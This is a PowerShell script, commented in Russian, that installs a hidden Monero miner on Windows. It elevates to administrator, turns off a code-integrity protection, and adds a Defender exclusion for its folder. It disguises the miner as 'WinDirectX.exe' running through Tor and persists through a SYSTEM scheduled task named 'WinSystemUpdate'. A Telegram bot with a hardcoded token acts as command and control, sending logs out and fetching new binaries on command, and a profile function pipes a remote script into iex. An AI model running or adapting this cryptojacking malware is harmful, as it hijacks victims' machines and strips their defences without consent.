# =========================================================
# ФИНАЛЬНЫЙ СКРИПТ УПРАВЛЕНИЯ (V11.1 - FIXED)
# =========================================================

# 1. ПРОВЕРКА АДМИНА
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    Start-Process powershell -Verb runAs -ArgumentList $arguments
    Break
}

# 2. РАНДОМ ИМЕНИ И КОНФИГ
$rand = -join ((65..90) | Get-Random -Count 2 | % {[char]$_})
$pcName = "E-MAXPC-$rand"
$path = "C:\ProgramData\SystemLib"
$wallet = "429bPnUKuYBQQVHoap1jKTWwiPfGuKAqL7ggbTFFZdbA3LyKScc6EnP9fTVeig7jNqaF7CFhUk5eCU8S5d85gWqU6Zt6bhA"
$user = "Isfandiyor0112-star"
$tgToken = "8260191816:AAE2rSVeuDnNG8nt4V-3vGjtfil3_ksqMwE"
$chatId = "6881699459"

# 3. СНЯТИЕ ОГРАНИЧЕНИЙ
Set-ExecutionPolicy Bypass -Scope Process -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Name "Enabled" -Value 0 -ErrorAction SilentlyContinue
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# 4. АНТИ-СОН
powercfg /hibernate off
powercfg /x -hibernate-timeout-ac 0
powercfg /x -standby-timeout-ac 0
powercfg /x -monitor-timeout-ac 5

# 5. ПАПКА И АНТИВИРУС
if (!(Test-Path $path)) { New-Item -ItemType Directory -Path $path -Force | Out-Null }
Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue

# 6. ФУНКЦИИ В ПРОФИЛЕ (ИСПРАВЛЕНО!)
$profilePath = "$HOME\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1"
$Functions = @"
function check {
    `$hashLine = Get-Content "$path\miner.log" -Tail 20 | Select-String "speed" | Select-Object -Last 1
    `$hash = if (`$hashLine) { `$hashLine.ToString().Split(' ')[-3] } else { "0" }
    Write-Host "--- СТАТУС $pcName ---" -ForegroundColor Cyan
    Write-Host "🚀 Speed: `$hash H/s" -ForegroundColor Green
}
function update { Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm https://raw.githubusercontent.com/$user/sminers/main/win_utility2.ps1 | iex`"" }
"@
$Functions | Out-File -FilePath $profilePath -Force -Encoding utf8

# 7. КОМАНДЫ ТЕЛЕГРАМ (БЛОК №9)
$ControlJob = {
    param($pcName, $tgToken, $chatId, $path, $user, $wallet)
    $lastUpdateId = 0
    while($true) {
        try {
            $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$tgToken/getUpdates?offset=$($lastUpdateId + 1)&timeout=10"
            foreach ($upd in $updates.result) {
                $lastUpdateId = $upd.update_id
                $msg = $upd.message.text.ToLower()
                
                if ($msg -eq "check" -or $msg -eq "check $pcName") {
                    $hashLine = Get-Content "$path\miner.log" -Tail 20 | Select-String "speed" | Select-Object -Last 1
                    $hash = if ($hashLine) { $hashLine.ToString().Split(' ')[-3] } else { "0" }
                    $temp = try { $t = Get-CimInstance -Namespace root/wmi -ClassName MsAcpi_ThermalZoneTemperature -ErrorAction SilentlyContinue; "$([math]::Round($t.CurrentTemperature / 10 - 273.15, 1))°C" } catch { "N/A" }
                    $mem = Get-CimInstance Win32_OperatingSystem | % { "$([math]::Round(($_.TotalVisibleMemorySize - $_.FreePhysicalMemory) / 1024 / 1024, 1))GB / $([math]::Round($_.TotalVisibleMemorySize / 1024 / 1024, 1))GB" }
                    $res = "📊 *ОТЧЕТ: $pcName*`n🚀 Speed: *$hash H/s*`n🔥 Temp: *$temp*`n🧠 RAM: *$mem*"
                    Invoke-RestMethod -Uri "https://api.telegram.org/bot$tgToken/sendMessage" -Method Post -Body @{chat_id=$chatId; text=$res; parse_mode="Markdown"}
                }
                
                if ($msg -eq "log $pcName" -or $msg -eq "log all") {
                    if (Test-Path "$path\miner.log") { curl.exe -F "chat_id=$chatId" -F "document=@$path\miner.log" "https://api.telegram.org/bot$tgToken/sendDocument" }
                }

                if ($msg -eq "delete $pcName" -or $msg -eq "delete all") {
                    Stop-Process -Name "WinDirectX", "tor", "taskhostw" -Force -ErrorAction SilentlyContinue
                    Remove-Item "$path\tor.exe" -Force -ErrorAction SilentlyContinue
                    Invoke-RestMethod -Uri "https://api.telegram.org/bot$tgToken/sendMessage?chat_id=$chatId&text=⚠️ [$pcName]: TOR УДАЛЕН. МАЙНЕР СТОП."
                }

                if ($msg -eq "update $pcName" -or $msg -eq "update all") {
                    Stop-Process -Name "WinDirectX", "tor", "taskhostw" -Force -ErrorAction SilentlyContinue
                    Invoke-WebRequest -Uri "https://github.com/$user/sminers/raw/main/WinDirectX" -OutFile "$path\WinDirectX.exe"
                    Invoke-WebRequest -Uri "https://github.com/$user/sminers/raw/main/tor" -OutFile "$path\tor.exe"
                    Start-Process -FilePath "$path\win_start.vbs"
                }
            }
        } catch {}
        Start-Sleep -Seconds 5
    }
}
Start-Job -ScriptBlock $ControlJob -ArgumentList $pcName, $tgToken, $chatId, $path, $user, $wallet

# 8. ЗАПУСК
$cmd = "@echo off`ntimeout /t 10 /nobreak >nul`nstart /b /low $path\WinDirectX.exe -o gulf.moneroocean.stream:443 -u $wallet -p $pcName --algo rx/0 --tls --proxy=socks5://127.0.0.1:9050 --threads=6 --log-file=$path\miner.log"
$cmd | Out-File -FilePath "$path\run_cache.bat" -Encoding ascii
$vbs = "Set W = CreateObject(`"WScript.Shell`")`nW.Run `"$path\tor.exe`", 0, False`nW.Run `"$path\run_cache.bat`", 0, False"
$vbs | Out-File -FilePath "$path\win_start.vbs" -Encoding ascii

$TaskAction = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$path\win_start.vbs`""
$TaskTrigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName "WinSystemUpdate" -Action $TaskAction -Trigger $TaskTrigger -User "SYSTEM" -RunLevel Highest -Force

Start-Process -FilePath "$path\win_start.vbs"
Invoke-RestMethod -Uri "https://api.telegram.org/bot$tgToken/sendMessage?chat_id=$chatId&text=🚀 [$pcName]: СИСТЕМА ОНЛАЙН!"
Write-Host "--- УСТАНОВКА ЗАВЕРШЕНА: $pcName ---" -ForegroundColor Magenta
